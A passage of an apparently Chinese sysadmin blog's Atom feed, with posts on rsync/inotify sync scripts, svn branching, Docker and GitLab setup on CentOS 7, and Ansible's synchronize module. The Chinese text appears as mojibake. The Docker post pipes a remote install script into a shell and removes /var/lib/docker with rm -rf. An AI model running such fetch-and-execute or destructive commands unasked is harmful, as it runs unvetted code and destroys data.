</code></pre><p>æ³¨æ„<code>/tmp/app_upload_files/</code> å¦‚æœæ”¹æˆ<code>/tmp/app_upload_files</code> (æœ«å°¾å°‘äº†æ–œæ ) æ¨é€è¿‡å»ç›®å½•ç»“æ„ä¼šå˜æˆ<code>/tmp/app_upload_files/app_upload_files</code>, å¦‚æœæç¤º<code>Permission denied</code>, åˆ™æ¨é€ç›®æ ‡ç«¯çš„ rsync é…ç½®æ–‡ä»¶éœ€è¦æŠŠ gid,uid æ”¹æˆ root</p>
<p>ç»“åˆ inotfy è„šæœ¬è¿›è¡Œå®æ—¶åŒæ­¥, åˆ™å¿…é¡»ç”¨æ¨çš„æ–¹å¼, å› ä¸ºæ˜¯ç›‘æ§æœ¬åœ°å˜åŒ–, å‘ç”Ÿå˜åŒ–æ¨é€åˆ°è¿œç«¯</p>
<p>inotify è„šæœ¬:</p>
<pre><code>cat /etc/rsyncd.d/inotify-rsync.sh
#!/bin/bash

# æ­¤è„šæœ¬ç”¨æ¥ç›‘æ§ æºç›®å½•æ–‡ä»¶å¤¹çš„å˜åŒ–, è·Ÿç›®æ ‡æœºå™¨è¿›è¡ŒrsyncåŒæ­¥

set -e
#æºç›®å½•
SRC=/tmp/app_upload_files/
#ç›®æ ‡æœåŠ¡å™¨ip
TARGET=192.168.0.3
#rsync ç”¨æˆ·
USER=hdruser
#rsync tag
TAG=app_upload_files
# å¯†ç æ–‡ä»¶
PASSWD=/etc/rsyncd.d/rsyncd.password

#modify,delete,create,attribè¿™äº›ä¸ºç›‘å¬çš„åŠ¨ä½œï¼Œæ¯”å¦‚å¦‚æœä¸è¦deleteï¼Œé‚£ä¹ˆåˆ é™¤çš„åŠ¨ä½œå°±ä¸ä¼šè§¦å‘åŒæ­¥
/bin/inotifywait -mrq --timefmt &apos;%d/%m/%y %H:%M&apos; --format &apos;%T %w%f%e&apos; -e modify,delete,create,attrib $SRC | while read files
do
/usr/bin/rsync -vzrtopgq  --progress --password-file=$PASSWD $SRC $USER@$TARGET::$TAG
done

# è¿è¡Œæ–¹å¼, ç»™è„šæœ¬èµ‹äºˆæ‰§è¡Œæƒé™, ç„¶åç”¨åå°çš„æ–¹å¼è¿è¡Œ: nohup /etc/rsyncd.d/inotify-rsync.sh &amp;
# åŠ åˆ°å¼€æœºå¯åŠ¨é¡¹: echo &quot;/etc/rsyncd.d/inotify-rsync.sh &amp;&quot; &gt;&gt; /etc/rc.local
</code></pre><p>æ³¨æ„:</p>
<p>nohup /etc/rsyncd.d/inotify-rsync.sh &amp; è¿™ä¸ªè„šæœ¬, å½“ rsync æŠ¥é”™çš„æ—¶å€™, å°±ä¼šè‡ªåŠ¨é€€å‡º</p>
<p>å¦‚æœrsync å¼€å¯delete å‚æ•°, åœ¨åŒæ­¥å¤±è´¥ä¹‹å, éœ€è¦å¤‡ä»½ä¸€ä¸‹æ–‡ä»¶å†æ¢å¤åŒæ­¥, å¦åˆ™å¯èƒ½é€ æˆæ•°æ®ä¸¢å¤±</p>
<p>å‚è€ƒ:</p>
<p><a href="http://xxling.com/blog/article/2093.aspx" target="_blank" rel="external">CentOS7é€šè¿‡rsyncå’Œinotifyè¿›è¡Œå®æ—¶åŒæ­¥</a></p>
<p><a href="https://segmentfault.com/a/1190000002558330" target="_blank" rel="external">å…³äºrsync+inotify-toolså®æ—¶åŒæ­¥æ¨¡å¼</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>rsync è„šæœ¬</p>]]>
    
    </summary>
    
      <category term="Centos 7" scheme="http://yoursite.com/tags/Centos-7/"/>
    
      <category term="rsync" scheme="http://yoursite.com/tags/rsync/"/>
    
      <category term="shell" scheme="http://yoursite.com/tags/shell/"/>
    
      <category term="it" scheme="http://yoursite.com/categories/it/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[svn ç‰ˆæœ¬æ§åˆ¶å‘½ä»¤]]></title>
    <link href="http://yoursite.com/2016/04/26/svn-%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6%E5%91%BD%E4%BB%A4/"/>
    <id>http://yoursite.com/2016/04/26/svn-ç‰ˆæœ¬æ§åˆ¶å‘½ä»¤/</id>
    <published>2016-04-26T10:20:04.000Z</published>
    <updated>2016-04-26T12:19:29.000Z</updated>
    <content type="html"><![CDATA[<h3 id="checkout__u7279_u5B9A_u7248_u672C"><a href="#checkout__u7279_u5B9A_u7248_u672C" class="headerlink" title="checkout ç‰¹å®šç‰ˆæœ¬"></a>checkout ç‰¹å®šç‰ˆæœ¬</h3><pre><code>svn checkout &lt;svnåœ°å€&gt; -r  &lt;ç‰ˆæœ¬å·&gt;
</code></pre><h3 id="u521B_u5EFA_u5206_u652F"><a href="#u521B_u5EFA_u5206_u652F" class="headerlink" title="åˆ›å»ºåˆ†æ”¯"></a>åˆ›å»ºåˆ†æ”¯</h3><pre><code>$ svn copy svn://test.evergrande.cn/test/trunk svn://test.evergrande.cn/test/branches/TRY-something -m &apos;make branches TRY-something&apos;
Committing transaction...
Committed revision 7.
</code></pre><p>å¿…é¡»è¦æœ‰trunkå’Œ branches ç›®å½•</p>
<p>å‚è€ƒ: </p>
<p><a href="http://blog.163.com/yang_jianli/blog/static/1619900062010101233015365/" target="_blank" rel="external">svn é€‰æ‹©æŒ‡å®šç‰ˆæœ¬</a></p>
<p><a href="http://xstarcd.github.io/wiki/sysadmin/svn_branch_tag_command.html" target="_blank" rel="external">svnå‘½ä»¤è¡Œåˆ›å»ºå’Œåˆ é™¤åˆ†æ”¯å’Œtags</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<h3 id="checkout__u7279_u5B9A_u7248_u672C"><a href="#checkout__u7279_u5B9A_u7248_u672C" class="headerlink" title="checkout ç‰¹å®šç‰ˆæœ¬"></a>checkou]]>
    </summary>
    
      <category term="svn" scheme="http://yoursite.com/tags/svn/"/>
    
      <category term="it" scheme="http://yoursite.com/categories/it/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Docker éƒ¨ç½²Gitlab]]></title>
    <link href="http://yoursite.com/2016/04/22/Docker-%E9%83%A8%E7%BD%B2Gitlab/"/>
    <id>http://yoursite.com/2016/04/22/Docker-éƒ¨ç½²Gitlab/</id>
    <published>2016-04-22T09:38:07.000Z</published>
    <updated>2016-05-11T07:40:47.000Z</updated>
    <content type="html"><![CDATA[<p>ç¯å¢ƒ: é˜¿é‡Œäº‘ centos7é•œåƒ, å·²ç»å®‰è£…äº† docker <a href="http://www.a-ho.com/2016/04/22/Centos-7-%E5%AE%89%E8%A3%85Docker/" target="_blank" rel="external">(docker å®‰è£…è¯¦æƒ…)</a></p>
<p>å‚è€ƒ:</p>
<p><a href="https://github.com/sameersbn/docker-gitlab#installation" target="_blank" rel="external">sameersbn/gitlab:8.6.6</a></p>
<p><a href="http://www.cnphp6.com/archives/99594" target="_blank" rel="external">ä½¿ç”¨DOCKERæ­å»ºGITLABå®è·µ</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>ç¯å¢ƒ: é˜¿é‡Œäº‘ centos7é•œåƒ, å·²ç»å®‰è£…äº† docker <a href="http://www.a-ho.com/2016/04/22/Centos-7-%E5%AE%89%E8%A3%85Docker/" target="_blank" rel="external]]>
    </summary>
    
      <category term="Docker" scheme="http://yoursite.com/tags/Docker/"/>
    
      <category term="Gitlab" scheme="http://yoursite.com/tags/Gitlab/"/>
    
      <category term="it" scheme="http://yoursite.com/categories/it/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Centos 7 å®‰è£…Docker]]></title>
    <link href="http://yoursite.com/2016/04/22/Centos-7-%E5%AE%89%E8%A3%85Docker/"/>
    <id>http://yoursite.com/2016/04/22/Centos-7-å®‰è£…Docker/</id>
    <published>2016-04-22T06:31:15.000Z</published>
    <updated>2016-05-11T07:34:37.000Z</updated>
    <content type="html"><![CDATA[<p>ç¯å¢ƒ:é˜¿é‡Œäº‘ centos7 é•œåƒ</p>
<h3 id="u5B89_u88C5"><a href="#u5B89_u88C5" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h3><p>1.æŸ¥çœ‹å†…æ ¸ç‰ˆæœ¬, å¦‚æœå†…æ ¸å¤ªæ—§, è¯·å‡çº§åˆ°æœ€æ–°ç‰ˆæœ¬</p>
<pre><code># uname -r
3.10.0-327.13.1.el7.x86_64

# yum update -y
</code></pre><p>2.å®˜æ–¹è„šæœ¬å®‰è£…</p>
<pre><code># curl -fsSL https://get.docker.com/ | sh
+ sh -c &apos;sleep 3; yum -y -q install docker-engine&apos;
warning: /var/cache/yum/x86_64/7/docker-main-repo/packages/docker-engine-selinux-1.11.0-1.el7.centos.noarch.rpm: Header V4 RSA/SHA512 Signature, key ID 2c52609d: NOKEY
Public key for docker-engine-selinux-1.11.0-1.el7.centos.noarch.rpm is not installed
https://yum.dockerproject.org/repo/main/centos/7/Packages/docker-engine-1.11.0-1.el7.centos.x86_64.rpm: [Errno 12] Timeout on https://yum.dockerproject.org/repo/main/centos/7/Packages/docker-engine-1.11.0-1.el7.centos.x86_64.rpm: (28, &apos;Operation timed out after 3000 milliseconds with 0 out of 0 bytes received&apos;)
Trying other mirror.
https://yum.dockerproject.org/repo/main/centos/7/Packages/docker-engine-1.11.0-1.el7.centos.x86_64.rpm: [Errno 12] Timeout on https://yum.dockerproject.org/repo/main/centos/7/Packages/docker-engine-1.11.0-1.el7.centos.x86_64.rpm: (28, &apos;Operation timed out after 3001 milliseconds with 0 out of 0 bytes received&apos;)
Trying other mirror.
Importing GPG key 0x2C52609D:
 Userid     : &quot;Docker Release Tool (releasedocker) &lt;docker@docker.com&gt;&quot;
 Fingerprint: 5811 8e89 f3a9 1289 7c07 0adb f762 2157 2c52 609d
 From       : https://yum.dockerproject.org/gpg
setsebool:  SELinux is disabled.

If you would like to use Docker as a non-root user, you should now consider
adding your user to the &quot;docker&quot; group with something like:

  sudo usermod -aG docker your-user

Remember that you will have to log out and back in for this to take effect!
</code></pre><p>3.å¯åŠ¨</p>
<pre><code>service docker start
</code></pre><p>4.æµ‹è¯•</p>
<pre><code># docker run hello-world
Unable to find image &apos;hello-world:latest&apos; locally
latest: Pulling from library/hello-world
03f4658f8b78: Pull complete
a3ed95caeb02: Pull complete
Digest: sha256:8be990ef2aeb16dbcb9271ddfe2610fa6658d13f6dfb8bc72074cc1ca36966a7
Status: Downloaded newer image for hello-world:latest

Hello from Docker.
This message shows that your installation appears to be working correctly.

To generate this message, Docker took the following steps:
 1. The Docker client contacted the Docker daemon.
 2. The Docker daemon pulled the &quot;hello-world&quot; image from the Docker Hub.
 3. The Docker daemon created a new container from that image which runs the
    executable that produces the output you are currently reading.
 4. The Docker daemon streamed that output to the Docker client, which sent it
    to your terminal.

To try something more ambitious, you can run an Ubuntu container with:
 $ docker run -it ubuntu bash

Share images, automate workflows, and more with a free Docker Hub account:
 https://hub.docker.com

For more examples and ideas, visit:
 https://docs.docker.com/userguide/
</code></pre><p>5.è®¾ç½®å¼€æœºå¯åŠ¨</p>
<pre><code># chkconfig docker on
Note: Forwarding request to &apos;systemctl enable docker.service&apos;.
Created symlink from /etc/systemd/system/multi-user.target.wants/docker.service to /usr/lib/systemd/system/docker.service.
</code></pre><h3 id="u5378_u8F7D"><a href="#u5378_u8F7D" class="headerlink" title="å¸è½½"></a>å¸è½½</h3><pre><code>yum list installed | grep docker
docker-engine.x86_64               1.11.0-1.el7.centos        @docker-main-repo
docker-engine-selinux.noarch       1.11.0-1.el7.centos        @docker-main-repo

yum -y remove docker-engine.x86_64

rm -rf /var/lib/docker
</code></pre>]]></content>
    <summary type="html">
    <![CDATA[<p>ç¯å¢ƒ:é˜¿é‡Œäº‘ centos7 é•œåƒ</p>
<h3 id="u5B89_u88C5"><a href="#u5B89_u88C5" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h3><p>1.æŸ¥çœ‹å†…æ ¸ç‰ˆæœ¬, å¦‚æœå†…æ ¸å¤ªæ—§, è¯·å‡çº§åˆ°æœ€æ–°ç‰ˆæœ¬<]]>
    </summary>
    
      <category term="docker" scheme="http://yoursite.com/tags/docker/"/>
    
      <category term="it" scheme="http://yoursite.com/categories/it/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Ansible synchronize]]></title>
    <link href="http://yoursite.com/2016/04/20/Ansible-synchronize/"/>
    <id>http://yoursite.com/2016/04/20/Ansible-synchronize/</id>
    <published>2016-04-20T12:00:58.000Z</published>
    <updated>2016-04-22T03:53:38.000Z</updated>
    <content type="html"><![CDATA[<p>æ³¨æ„å‡ ä¸ªå‚æ•°,[default: no]æˆ–è€…æœ‰ç‰¹æ®Šé…ç½®çš„:</p>
<ul>
<li>copy_links    æ‹·è´è½¯è¿æ¥çš„çœŸå®æ–‡ä»¶, è€Œä¸æ˜¯è½¯è¿æ¥</li>
<li>delete    åœ¨è¿›è¡ŒåŒæ­¥åæ˜¯å¦åˆ é™¤ src ä¸­ä¸å­˜åœ¨çš„æ–‡ä»¶, é»˜è®¤æƒ…å†µä¸‹, æ˜¯ä¼šä¿ç•™ dest ç›®æ ‡æ–‡ä»¶å¤¹åŸå…ˆå°±å­˜åœ¨çš„æ–‡ä»¶</li>
<li>existing_only    ?</li>
<li>mode      [ default: push ]æœ¬åœ°æˆ–è€…å§”æ‰˜åˆ°ç›®æ ‡æœº</li>
</ul>
<a id="more"></a>
<h3 id="ansible-doc"><a href="#ansible-doc" class="headerlink" title="ansible-doc"></a>ansible-doc</h3><figure class="highlight vbnet"><table><tr><td class="code"><pre><span class="line">&gt; SYNCHRONIZE</span><br><span class="line"></span><br><span class="line">  This <span class="keyword">is</span> a wrapper around rsync. <span class="keyword">Of</span> course you could just use the</span><br><span class="line">  command action <span class="keyword">to</span> <span class="keyword">call</span> rsync yourself, but you also have <span class="keyword">to</span> add a</span><br><span class="line">  fair number <span class="keyword">of</span> boilerplate options <span class="keyword">and</span> host facts. You still may</span><br><span class="line">  need <span class="keyword">to</span> <span class="keyword">call</span> rsync directly via `command<span class="comment">' or `shell' depending on</span></span><br><span class="line">  your use <span class="keyword">case</span>. The synchronize action <span class="keyword">is</span> meant <span class="keyword">to</span> <span class="keyword">do</span> common things</span><br><span class="line">  <span class="keyword">with</span> `rsync<span class="comment">' easily. It does not provide access to the full power of</span></span><br><span class="line">  rsync, but does make most invocations easier <span class="keyword">to</span> follow.</span><br><span class="line"></span><br><span class="line">Options (= <span class="keyword">is</span> mandatory):</span><br><span class="line"></span><br><span class="line">- archive</span><br><span class="line">        Mirrors the rsync archive flag, enables recursive, links,</span><br><span class="line">        perms, times, owner, <span class="keyword">group</span> flags <span class="keyword">and</span> -D. (Choices: yes, no)</span><br><span class="line">        [<span class="keyword">Default</span>: yes]</span><br><span class="line"></span><br><span class="line">- checksum</span><br><span class="line">        <span class="keyword">Skip</span> based <span class="keyword">on</span> checksum, rather than <span class="keyword">mod</span>-time &amp; size; Note that</span><br><span class="line">        that <span class="string">"archive"</span> <span class="keyword">option</span> <span class="keyword">is</span> still enabled <span class="keyword">by</span> <span class="keyword">default</span> - the</span><br><span class="line">        <span class="string">"checksum"</span> <span class="keyword">option</span> will <span class="keyword">not</span> disable it. (Choices: yes, no)</span><br><span class="line">        [<span class="keyword">Default</span>: no]</span><br><span class="line"></span><br><span class="line">- compress</span><br><span class="line">        Compress file data during the transfer. <span class="keyword">In</span> most cases, leave</span><br><span class="line">        this enabled unless it causes problems. (Choices: yes, no)</span><br><span class="line">        [<span class="keyword">Default</span>: yes]</span><br><span class="line"></span><br><span class="line">- copy_links</span><br><span class="line">        Copy symlinks <span class="keyword">as</span> the item that they point <span class="keyword">to</span> (the referent) <span class="keyword">is</span></span><br><span class="line">        copied, rather than the symlink. (Choices: yes, no) [<span class="keyword">Default</span>:</span><br><span class="line">        no]</span><br><span class="line"></span><br><span class="line">- delete</span><br><span class="line">        Delete files that don<span class="comment">'t exist (after transfer, not before) in</span></span><br><span class="line">        the `src<span class="comment">' path. This option requires `recursive=yes'.</span></span><br><span class="line">        (Choices: yes, no) [<span class="keyword">Default</span>: no]</span><br><span class="line"></span><br><span class="line">= dest</span><br><span class="line">        Path <span class="keyword">on</span> the destination machine that will be synchronized <span class="keyword">from</span></span><br><span class="line">        the source; The path can be absolute <span class="keyword">or</span> relative.</span><br><span class="line"></span><br><span class="line">- dest_port</span><br><span class="line">        Port number <span class="keyword">for</span> ssh <span class="keyword">on</span> the destination host. The</span><br><span class="line">        ansible_ssh_port inventory var takes precedence over this</span><br><span class="line">        value. [<span class="keyword">Default</span>: <span class="number">22</span>]</span><br><span class="line"></span><br><span class="line">- dirs</span><br><span class="line">        Transfer directories without recursing (Choices: yes, no)</span><br><span class="line">        [<span class="keyword">Default</span>: no]</span><br><span class="line"></span><br><span class="line">- existing_only</span><br><span class="line">        <span class="keyword">Skip</span> creating <span class="keyword">new</span> files <span class="keyword">on</span> receiver. (Choices: yes, no)</span><br><span class="line">        [<span class="keyword">Default</span>: no]</span><br><span class="line"></span><br><span class="line">- <span class="keyword">group</span></span><br><span class="line">        <span class="keyword">Preserve</span> <span class="keyword">group</span> (Choices: yes, no) [<span class="keyword">Default</span>: the value <span class="keyword">of</span> the</span><br><span class="line">        archive <span class="keyword">option</span>]</span><br><span class="line"></span><br><span class="line">- links</span><br><span class="line">        Copy symlinks <span class="keyword">as</span> symlinks. (Choices: yes, no) [<span class="keyword">Default</span>: the</span><br><span class="line">        value <span class="keyword">of</span> the archive <span class="keyword">option</span>]</span><br><span class="line"></span><br><span class="line">- mode</span><br><span class="line">        Specify the direction <span class="keyword">of</span> the synchronization. <span class="keyword">In</span> push mode the</span><br><span class="line">        localhost <span class="keyword">or</span> <span class="keyword">delegate</span> <span class="keyword">is</span> the source; <span class="keyword">In</span> pull mode the remote</span><br><span class="line">        host <span class="keyword">in</span> context <span class="keyword">is</span> the source. (Choices: push, pull) [<span class="keyword">Default</span>:</span><br><span class="line">        push]</span><br><span class="line"></span><br><span class="line">- owner</span><br><span class="line">        <span class="keyword">Preserve</span> owner (super user only) (Choices: yes, no) [<span class="keyword">Default</span>:</span><br><span class="line">        the value <span class="keyword">of</span> the archive <span class="keyword">option</span>]</span><br><span class="line"></span><br><span class="line">- perms</span><br><span class="line">        <span class="keyword">Preserve</span> permissions. (Choices: yes, no) [<span class="keyword">Default</span>: the value</span><br><span class="line">        <span class="keyword">of</span> the archive <span class="keyword">option</span>]</span><br><span class="line"></span><br><span class="line">- recursive</span><br><span class="line">        Recurse <span class="keyword">into</span> directories. (Choices: yes, no) [<span class="keyword">Default</span>: the</span><br><span class="line">        value <span class="keyword">of</span> the archive <span class="keyword">option</span>]</span><br><span class="line"></span><br><span class="line">- rsync_opts</span><br><span class="line">        Specify additional rsync options <span class="keyword">by</span> passing <span class="keyword">in</span> an array.</span><br><span class="line">        [<span class="keyword">Default</span>: None]</span><br><span class="line"></span><br><span class="line">- rsync_path</span><br><span class="line">        Specify the rsync command <span class="keyword">to</span> run <span class="keyword">on</span> the remote machine. See</span><br><span class="line">        `--rsync-path<span class="comment">' on the rsync man page.</span></span><br><span class="line"></span><br><span class="line">- rsync_timeout</span><br><span class="line">        Specify a --timeout <span class="keyword">for</span> the rsync command <span class="keyword">in</span> seconds.</span><br><span class="line">        [<span class="keyword">Default</span>: <span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">- set_remote_user</span><br><span class="line">        put user@ <span class="keyword">for</span> the remote paths. <span class="keyword">If</span> you have a <span class="keyword">custom</span> ssh</span><br><span class="line">        config <span class="keyword">to</span> define the remote user <span class="keyword">for</span> a host that does <span class="keyword">not</span></span><br><span class="line">        match the inventory user, you should <span class="keyword">set</span> this parameter <span class="keyword">to</span></span><br><span class="line">        <span class="string">"no"</span>. [<span class="keyword">Default</span>: <span class="literal">True</span>]</span><br><span class="line"></span><br><span class="line">= src</span><br><span class="line">        Path <span class="keyword">on</span> the source machine that will be synchronized <span class="keyword">to</span> the</span><br><span class="line">        destination; The path can be absolute <span class="keyword">or</span> relative.</span><br><span class="line"></span><br><span class="line">- times</span><br><span class="line">        <span class="keyword">Preserve</span> modification times (Choices: yes, no) [<span class="keyword">Default</span>: the</span><br><span class="line">        value <span class="keyword">of</span> the archive <span class="keyword">option</span>]</span><br><span class="line"></span><br><span class="line">Notes:  rsync must be installed <span class="keyword">on</span> both the local <span class="keyword">and</span> remote machine.</span><br><span class="line">        Inspect the verbose output <span class="keyword">to</span> validate the destination</span><br><span class="line">        user/host/path are what was expected. The remote user <span class="keyword">for</span> the</span><br><span class="line">        dest path will always be the remote_user, <span class="keyword">not</span> the sudo_user.</span><br><span class="line">        Expect that dest=~/x will be ~&lt;remote_user&gt;/x even <span class="keyword">if</span> <span class="keyword">using</span></span><br><span class="line">        sudo. <span class="keyword">To</span> exclude files <span class="keyword">and</span> directories <span class="keyword">from</span> being</span><br><span class="line">        synchronized, you may add `.rsync-filter<span class="comment">' files to the source</span></span><br><span class="line">        directory.</span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">EXAMPLES:</span><br><span class="line"># Synchronization of src on the control machine to dest on the remote hosts</span><br><span class="line">synchronize: src=some/relative/path dest=/some/absolute/path</span><br><span class="line"></span><br><span class="line"># Synchronization without any <span class="comment">--archive options enabled</span></span><br><span class="line">synchronize: src=some/relative/path dest=/some/absolute/path archive=no</span><br><span class="line"></span><br><span class="line"># Synchronization with <span class="comment">--archive options enabled except for --recursive</span></span><br><span class="line">synchronize: src=some/relative/path dest=/some/absolute/path recursive=no</span><br><span class="line"></span><br><span class="line"># Synchronization with <span class="comment">--archive options enabled except for --times, with --checksum option enabled</span></span><br><span class="line">synchronize: src=some/relative/path dest=/some/absolute/path <span class="operator"><span class="keyword">checksum</span>=yes times=<span class="keyword">no</span></span><br><span class="line"></span><br><span class="line"># Synchronization <span class="keyword">without</span> <span class="comment">--archive options enabled except use --links</span></span><br><span class="line">synchronize: src=<span class="keyword">some</span>/<span class="keyword">relative</span>/<span class="keyword">path</span> dest=/<span class="keyword">some</span>/<span class="keyword">absolute</span>/<span class="keyword">path</span> <span class="keyword">archive</span>=<span class="keyword">no</span> links=yes</span><br><span class="line"></span><br><span class="line"># Synchronization <span class="keyword">of</span> two paths <span class="keyword">both</span> <span class="keyword">on</span> the control machine</span><br><span class="line">local_action: synchronize src=<span class="keyword">some</span>/<span class="keyword">relative</span>/<span class="keyword">path</span> dest=/<span class="keyword">some</span>/<span class="keyword">absolute</span>/<span class="keyword">path</span></span><br><span class="line"></span><br><span class="line"># Synchronization <span class="keyword">of</span> src <span class="keyword">on</span> the inventory host <span class="keyword">to</span> the dest <span class="keyword">on</span> the localhost <span class="keyword">in</span></span><br><span class="line">pull <span class="keyword">mode</span></span><br><span class="line">synchronize: <span class="keyword">mode</span>=pull src=<span class="keyword">some</span>/<span class="keyword">relative</span>/<span class="keyword">path</span> dest=/<span class="keyword">some</span>/<span class="keyword">absolute</span>/<span class="keyword">path</span></span><br><span class="line"></span><br><span class="line"># Synchronization <span class="keyword">of</span> src <span class="keyword">on</span> <span class="keyword">delegate</span> host <span class="keyword">to</span> dest <span class="keyword">on</span> the <span class="keyword">current</span> inventory host.</span><br><span class="line"># <span class="keyword">If</span> delegate_to <span class="keyword">is</span> <span class="keyword">set</span> <span class="keyword">to</span> the <span class="keyword">current</span> inventory host, this can be used <span class="keyword">to</span> syncronize</span><br><span class="line"># two directories <span class="keyword">on</span> that host. </span><br><span class="line">synchronize: &gt;</span><br><span class="line">    src=<span class="keyword">some</span>/<span class="keyword">relative</span>/<span class="keyword">path</span> dest=/<span class="keyword">some</span>/<span class="keyword">absolute</span>/<span class="keyword">path</span></span><br><span class="line">    delegate_to: <span class="keyword">delegate</span>.host</span><br><span class="line"></span><br><span class="line"># Synchronize <span class="keyword">and</span> <span class="keyword">delete</span> files <span class="keyword">in</span> dest <span class="keyword">on</span> the remote host that <span class="keyword">are</span> <span class="keyword">not</span> <span class="keyword">found</span> <span class="keyword">in</span> src <span class="keyword">of</span> localhost.</span><br><span class="line">synchronize: src=<span class="keyword">some</span>/<span class="keyword">relative</span>/<span class="keyword">path</span> dest=/<span class="keyword">some</span>/<span class="keyword">absolute</span>/<span class="keyword">path</span> <span class="keyword">delete</span>=yes</span><br><span class="line"></span><br><span class="line"># Synchronize <span class="keyword">using</span> an alternate rsync command</span><br><span class="line">synchronize: src=<span class="keyword">some</span>/<span class="keyword">relative</span>/<span class="keyword">path</span> dest=/<span class="keyword">some</span>/<span class="keyword">absolute</span>/<span class="keyword">path</span> rsync_path=<span class="string">"sudo rsync"</span></span><br><span class="line"></span><br><span class="line"># Example .rsync-filter <span class="keyword">file</span> <span class="keyword">in</span> the <span class="keyword">source</span> <span class="keyword">directory</span></span><br><span class="line">- <span class="keyword">var</span>       # <span class="keyword">exclude</span> <span class="keyword">any</span> <span class="keyword">path</span> whose <span class="keyword">last</span> part <span class="keyword">is</span> <span class="string">'var'</span></span><br><span class="line">- /<span class="keyword">var</span>      # <span class="keyword">exclude</span> <span class="keyword">any</span> <span class="keyword">path</span> <span class="keyword">starting</span> <span class="keyword">with</span> <span class="string">'var'</span> <span class="keyword">starting</span> <span class="keyword">at</span> the <span class="keyword">source</span> <span class="keyword">directory</span></span><br><span class="line">+ /<span class="keyword">var</span>/conf # <span class="keyword">include</span> /<span class="keyword">var</span>/conf even though it was previously excluded</span><br><span class="line"></span><br><span class="line"># Synchronize <span class="keyword">passing</span> <span class="keyword">in</span> extra rsync options</span><br><span class="line">synchronize: src=/tmp/helloworld dest=/<span class="keyword">var</span>/www/helloword rsync_opts=<span class="comment">--no-motd,--exclude=.git</span></span></span><br></pre></td></tr></table></figure>
<h3 id="u7528_u6765_u505A_u751F_u4EA7_u73AF_u5883_beta__u73AF_u5883_u540C_u6B65"><a href="#u7528_u6765_u505A_u751F_u4EA7_u73AF_u5883_beta__u73AF_u5883_u540C_u6B65" class="headerlink" title="ç”¨æ¥åšç”Ÿäº§ç¯å¢ƒ beta ç¯å¢ƒåŒæ­¥"></a>ç”¨æ¥åšç”Ÿäº§ç¯å¢ƒ beta ç¯å¢ƒåŒæ­¥</h3><p>åŒæ­¥ nginx ä¸»ç›®å½•ä¸‹çš„é…ç½®, é™¤äº† vhost é…ç½®ç›®å½•ä¸åŒæ­¥</p>
<p>ä¸€ä¸ªå‘:</p>
<pre><code>synchronize: src=~/Documents/eg/svn/everinner_app_beta/config_app dest=/opt/www
</code></pre><p>è¿™ä¸ªç›¸å½“äºæŠŠ<code>config_app</code>ç›®å½•æ‹·è´åˆ°<code>/opt/www</code>ä¸‹, æ‹·è´åå˜æˆ<code>/opt/www/config_app</code>, å¦‚æœ å†™æˆ<code>dest=/opt/www/config_app</code>, æ‹·è´åä¼šå˜æˆ<code>/opt/www/config_app/config_app</code></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>æ³¨æ„å‡ ä¸ªå‚æ•°,[default: no]æˆ–è€…æœ‰ç‰¹æ®Šé…ç½®çš„:</p>
<ul>
<li>copy_links    æ‹·è´è½¯è¿æ¥çš„çœŸå®æ–‡ä»¶, è€Œä¸æ˜¯è½¯è¿æ¥</li>
<li>delete    åœ¨è¿›è¡ŒåŒæ­¥åæ˜¯å¦åˆ é™¤ src ä¸­ä¸å­˜åœ¨çš„æ–‡ä»¶, é»˜è®¤æƒ…å†µä¸‹, æ˜¯ä¼šä¿ç•™ dest ç›®æ ‡æ–‡ä»¶å¤¹åŸå…ˆå°±å­˜åœ¨çš„æ–‡ä»¶</li>
<li>existing_only    ?</li>
<li>mode      [ default: push ]æœ¬åœ°æˆ–è€…å§”æ‰˜åˆ°ç›®æ ‡æœº</li>
</ul>]]>
    
    </summary>
    
      <category term="Ansible" scheme="http://yoursite.com/tags/Ansible/"/>
    
      <category term="Synchronize" scheme="http://yoursite.com/tags/Synchronize/"/>
    
      <category term="it" scheme="http://yoursite.com/categories/it/"/>
    
  </entry>
  
</feed>
